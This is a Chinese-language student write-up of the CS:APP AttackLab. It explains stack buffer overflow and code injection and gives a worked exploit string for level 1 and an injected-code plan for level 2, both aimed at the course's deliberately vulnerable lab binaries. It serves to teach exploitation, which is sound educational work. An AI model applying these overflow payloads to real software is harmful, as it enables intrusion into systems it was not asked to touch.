# Lab3 AttackLab
## 实验准备
- 实验介绍：利用可执行程序的漏洞，完成缓冲区溢出攻击。
- 实验环境：Windows11 的 WSL2(Ubuntu 24.04.2 LTS)，实验在 WSL2 的 linux 环境运行。VSCODE 作为代码编辑器，通过 SSH 连接到 WSL2。较新版本的 WSL2 可直接完成实验，无需配置虚拟机或者docker环境。
- 程序运行和调试：使用 lldb + vscode，使用图形化调试方式调试汇编语言。
- 去CSAPP官网下载 WriteUp(实验文档)，Self-Study Handout。然后就可以按照实验文档的指引，开启实验了。
- 实验包含两个可执行程序，`ctarget` `rtarget`。使用`objdump -d ctarget > ctarget.s` `objdump -d rtarget > rtarget.s`可获得可执行程序的汇编代码。
- 实验有5个题目。对每个题目，你需要输入一个单行字符串作为攻击字符串(exploit string)，且使用两个16进制数表示单个byte，比如你输入的攻击字符串可以是`48 b8 35 39 62 39 00 00`。在实验文件夹中创建一个`exploit.txt`文件，然后将攻击字符串写入该文件。
- 执行下列命令。`hex2raw`能够将你编写的人类可读的十六进制（Hex）攻击字符串，转换成程序能够识别的原始二进制（Raw Binary）数据。
```bash
unix> ./hex2raw < exploit.txt > exploit-raw.txt
```
WriteUp中提及，使用以下命令，使得可执行程序能够读取二进制转化后的攻击字符串。
```bash
unix> ./ctarget -i exploit-raw.txt
```
但是在本地执行上述命令会得到报错：`FAILED: Initialization error: Running on an illegal host`。writeup中提及`-q: Don’t send results to the grading server`，所以本地实验需要加上参数q。
- 因此，进行缓冲区溢出攻击的命令是(ctarget | rtarget 的命令格式完全一致)：
```bash
unix> ./ctarget -qi exploit-raw.txt
```
为了实现图形化调试，在实验文件夹创建文件夹`.vscode`，在`.vscode`创建文件`launch.json`，输入下列内容。然后按下vscode“运行和调试”界面的执行按钮，即可图形化运行程序。
```json
{
    "version": "0.2.0",
    "configurations": [
        {
            "type": "lldb",
            "request": "launch",
            "name": "Debug",
            "program": "ctarget", // level4, level5 替换为 rtarget
            "args": ["-q", "-i", "exploit-raw.txt"],
            "initCommands": [
                "breakpoint set --name test",
             ]
        } 
    ]
} 
```
- `breakpoint set --name test`会使得程序停在test函数汇编代码的第一行，修改这条指令的`test`为其它函数名(比如`getbuf`、`touch1`、`touch2`、`touch3`)可以对相应函数进行调试，这在后续实验中检测你的攻击是否符合预期是有益的。
- 程序执行效果。左侧箭头表示调试器停驻点。
```asm
    ; Symbol: test
    ; Source: /usr0/home/droh/ics3/im/labs/attacklab/src/build/visible.c:90
    00401968: 48 83 EC 08                   subq   $0x8, %rsp
--> 0040196C: B8 00 00 00 00                movl   $0x0, %eax
    00401971: E8 32 FE FF FF                callq  0x4017a8  ; getbuf at buf.c:12
    00401976: 89 C2                         movl   %eax, %edx
    00401978: BE 88 31 40 00                movl   $0x403188, %esi  ; imm = 0x403188 
    0040197D: BF 01 00 00 00                movl   $0x1, %edi
    00401982: B8 00 00 00 00                movl   $0x0, %eax
    00401987: E8 64 F4 FF FF                callq  0x400df0  ; symbol stub for: __printf_chk
    0040198C: 48 83 C4 08                   addq   $0x8, %rsp
    00401990: C3                            retq   
```
## 基础知识：Code Injection & Return-oriented programming
0. 本实验的输入缓冲区
- 这个实验我们的输入将存放到`getbuf`里面的buf，其大小为 BUFFER_SIZE，如果我们的输入长度超出了BUFFER_SIZE，就会破坏原有栈结构，实现缓冲区溢出攻击。 
```c
unsigned getbuf() {
    char buf[BUFFER_SIZE]; // 本实验的 BUFFER_SIZE 是 0x28，所以 buffer 是 40 个字节
    Gets(buf);
    return 1;
}
void test() {
    int val;
    val = getbuf();
    printf("Noexploit. Getbufreturned0x%x\n",val);
}
```
1. **Code Injection(CI)**
- 向缓冲区输入超出buffer大小的字节以破坏栈结构。下图展示了`test`调用`getbuf`时的栈帧结构(地址向上增长)，当你在地址`buffer+BUFFER_SIZE`开始的8个字节写入一些字节，你就可以覆盖返回地址了，如果写入了 buffer 的起始地址，那么在 getbuf 执行 ret 指令后，程序计数器`%rip`将指向 buffer 的起始地址。如果你在 buffer 里面填写了一些汇编指令的二进制编码，那么程序将执行这些汇编指令。
![alt text](attacklab-images/缓冲区溢出攻击.drawio.svg)
2. **Return-oriented programming(ROP)**
- PASS!
## level1
- 在`getbuf`执行结束后跳转到`touch1`。
- 根据`getbuf`的汇编指令`subq $0x28, %rsp`，buffer 的大小是40字节。所以输入攻击字符串时，将40个字节填满，随后8个字节填入`touch1`的地址（touch1函数第一条指令的地址）即可，通过`ctarget.s`，找到`00000000004017c0 <touch1>:`，所以`touch1`的地址是`0x4017c0`，将其充满8字节，并且使用 **小端法** 表示，得到`c0 17 40 00 00 00 00 00`。
- 我们使用40个字符0填满buffer，随后8个字节使用touch1的地址替换`test`栈帧的Return Address，得到本题的答案：
```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00
```
## level2
- 在`getbuf`执行结束后，给`touch2`传递整数(数值需要等于`cookie.txt`里面的值)，然后跳转到`touch2`。
- 由于需要执行汇编指令给`touch2`传参，所以需要在`buffer`里面写传参指令，这里 cookie == 0x59b997fa，将这个数据传入`%rdi`即可。得到的汇编指令是`movq $0x59b997fa, %rdi`。可通过`gcc -c`及`objdump -d`进行汇编和反汇编，得到汇编指令的二进制表示：`48 c7 c7 fa 97 b9 59`。
- 为了能够跳转执行`buffer`中我们自己写入的指令，需要将`test`栈帧的Return Address替换为buffer的起始地址，这里没有使用栈地址随机初始化，所以`buffer`的起始地址是不变的，单步执行getbuf函数的`subq $0x28, %rsp`指令后，打印`%rsp`寄存器的值，得到buffer的起始地址是`0x5561dc78`。所以将`test`栈帧的Return Address这8个字节替换为`78 dc 61 55 00 00 00 00`。
- 在buffer里面，给touch2传参后，还需要能够跳转执行touch2，touch2的地址是`0x4017ec`。我们需要通过`ret`指令进行跳转。而`ret`指令的本质是弹出一个栈顶元素，将其赋值给`%rip`。所以需要将touch2的地址push到栈里面，然后调用返回指令。
- 由此，我们需要在buffer及buffer后面8个字节写入的内容是：(其中，汇编语句需要转为二进制指令，返回地址需要小端法表示且占8个字节。地址由下到上增长，指令由下方到上方执行)
```asm
原来test栈帧的return address --> 0x4017ec             
                                ...(填充到40个字节)    
                                ret                    
                                pushq $0x4017ec       
                    buffer  --> movq $0x59b997fa, %rdi
```
